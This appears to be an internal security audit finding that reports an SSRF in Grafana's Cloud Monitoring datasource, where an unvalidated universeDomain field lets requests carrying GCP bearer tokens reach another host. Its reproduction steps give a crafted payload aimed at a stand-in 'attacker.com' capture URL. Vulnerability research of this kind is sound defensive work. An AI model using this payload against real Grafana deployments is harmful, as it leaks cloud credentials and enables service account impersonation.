Phase: 9
Sequence: 074
Slug: cloud-monitoring-universe-domain-ssrf
Verdict: VALID
Rationale: The cloud-monitoring datasource buildURL() concatenates the user-supplied universeDomain field from jsonData verbatim into a URL template without any format validation, allowing an admin with datasources:write to redirect outbound monitoring API requests to an attacker-controlled host via URL-special characters.
Severity-Original: MEDIUM
PoC-Status: theoretical
Origin-Finding: security/findings-draft/p7-021-cloud-migration-ssrf.md
Origin-Pattern: AP-021

## Summary

The Cloud Monitoring datasource plugin (`pkg/tsdb/cloud-monitoring/httpclient.go`) constructs outbound API URLs by string-concatenating the `universeDomain` field from the datasource JSON configuration directly onto a fixed prefix: `"https://monitoring." + universeDomain` and `"https://cloudresourcemanager." + universeDomain`. The `universeDomain` field originates from the datasource's `jsonData` blob, which is set by any user with `datasources:write` permission via `PUT /api/datasources/uid/:uid`. No format validation exists for this field in either the datasource API handler (`validateJSONData` only checks for auth proxy header conflicts) or the plugin itself. URL-special characters in `universeDomain` (specifically `.`) can redirect monitoring API calls and health checks to an attacker-controlled host. This is the same AP-021 pattern — user-controlled string concatenated into a URL template without sanitization — applied to the Cloud Monitoring datasource plugin.

## Location

- **Vulnerable URL construction**: `pkg/tsdb/cloud-monitoring/httpclient.go:71-76` — `buildURL()` function
- **Datasource config ingestion**: `pkg/tsdb/cloud-monitoring/cloudmonitoring.go:184` — `universeDomain: jsonData.UniverseDomain`
- **URL used in HTTP requests**:
  - `cloudmonitoring.go:95` — health check request to `dsInfo.services[cloudMonitor].url`
  - `utils.go:61` — metric query request to `dsInfo.services[cloudMonitor].url`
  - `promql_query.go:68` — PromQL query request to `dsInfo.services[cloudMonitor].url`
  - `resource_handler.go:361-367` — resource proxy request sets `req.URL.Host` from parsed `dsInfo.services[subDataSource].url`
- **No validation**: `pkg/api/datasources.go:348-366` — `validateJSONData` does not validate `universeDomain` or any URL-typed fields in jsonData.
- **Entry points**:
  - `PUT /api/datasources/uid/:uid` (authorize `datasources:write`) — sets universeDomain
  - `POST /api/datasources` (authorize `datasources:create`) — sets universeDomain
  - `GET /api/datasources/uid/:uid/health` — triggers health check → http request using built URL
  - Plugin query execution — triggers metric queries using built URL

## Attacker Control

- **Input**: `universeDomain` field in the datasource `jsonData` payload, e.g.:
  ```json
  {"jsonData": {"universeDomain": "attacker.com/path?q=", "authenticationType": "gce"}}
  ```
  This produces: `buildURL("cloudmonitoring", "attacker.com/path?q=")` = `"https://monitoring.attacker.com/path?q="`
- **Authentication required**: `datasources:write` permission (typically Grafana Admin or Editor with datasource admin rights). This is lower privilege than GrafanaAdmin required for p7-021.
- **Injection technique**: `universeDomain = "attacker.com/steal?token="` produces `https://monitoring.attacker.com/steal?token=` followed by the GCP API path, effectively redirecting to `monitoring.attacker.com`.

## Trust Boundary Crossed

TB1 — Internet Edge (outbound). The Grafana backend makes HTTP requests (with GCP OAuth tokens or service account credentials attached) to an attacker-controlled host instead of the legitimate Google Cloud Monitoring API. The requests include GCP authentication middleware tokens (`Authorization: Bearer <gcp_token>`).

## Impact

- **SSRF to attacker-controlled host**: Cloud Monitoring health check and all metric queries are redirected to the attacker's server.
- **GCP OAuth token leakage**: The `getMiddleware()` function in `httpclient.go:36` attaches a GCP access token (from GCE metadata service or JWT private key) to every HTTP request via `tokenprovider.AuthMiddleware`. These tokens are sent to the attacker's SSRF target.
- **GCP service account key exfiltration**: For JWT authentication mode, the service account private key is used to generate tokens. Leaking the GCP access token allows the attacker to impersonate the service account for the token's validity period.
- **Lower bar than p7-021**: Requires only `datasources:write` rather than GrafanaAdmin; any datasource admin (Editor role with the right RBAC grant in Grafana 8+) can exploit this.
- **No feature flag gate**: Unlike cloud migration (which is disabled by default), Cloud Monitoring datasource requires no special configuration to be active — it is available to any Grafana instance with the cloud-monitoring plugin installed.

## Evidence

**Vulnerable buildURL (httpclient.go:71-76):**
```go
func buildURL(route string, universeDomain string) string {
    if universeDomain == "" {
        universeDomain = "googleapis.com"
    }
    return routes[route].url + universeDomain  // "https://monitoring." + universeDomain
}
```

**No url.Parse call — pure string concatenation, no validation:**
The returned string is stored as `dsInfo.services[name].url` and later used directly in `http.NewRequest`:
```go
// cloudmonitoring.go:95
url := fmt.Sprintf("%s/v3/projects/%s/metricDescriptors", dsInfo.services[cloudMonitor].url, defaultProject)
request, err := http.NewRequest(http.MethodGet, url, nil)
// ...
res, err := dsInfo.services[cloudMonitor].client.Do(request)
```

**universeDomain comes directly from datasource jsonData with no validation:**
```go
// cloudmonitoring.go:154, 184
UniverseDomain string `json:"universeDomain"`
// ...
universeDomain: jsonData.UniverseDomain,
```

**validateJSONData does not check universeDomain (datasources.go:348-366):**
```go
func validateJSONData(jsonData *simplejson.Json, cfg *setting.Cfg) error {
    if jsonData == nil {
        return nil
    }
    if cfg.AuthProxy.Enabled {
        // only checks for auth proxy header name conflicts
    }
    return nil
}
```

**GCP token middleware attached to the SSRF-targeted HTTP client:**
```go
// httpclient.go:36
func getMiddleware(model *datasourceInfo, routePath string) (httpclient.Middleware, error) {
    // ...
    return tokenprovider.AuthMiddleware(provider), nil  // attaches Bearer token
}
```

## Reproduction Steps

1. Authenticate to Grafana with an account that has `datasources:write` permission.
2. Create or update a Cloud Monitoring datasource with crafted jsonData:
   ```json
   {
     "type": "stackdriver",
     "jsonData": {
       "authenticationType": "gce",
       "universeDomain": "attacker.com/capture?t="
     }
   }
   ```
3. Trigger a health check: `GET /api/datasources/uid/<uid>/health`
4. Observe: Grafana makes an outbound GET to `https://monitoring.attacker.com/capture?t=/v3/projects/<project>/metricDescriptors` with `Authorization: Bearer <gcp_access_token>`.
5. The GCP access token is leaked to the attacker's server.
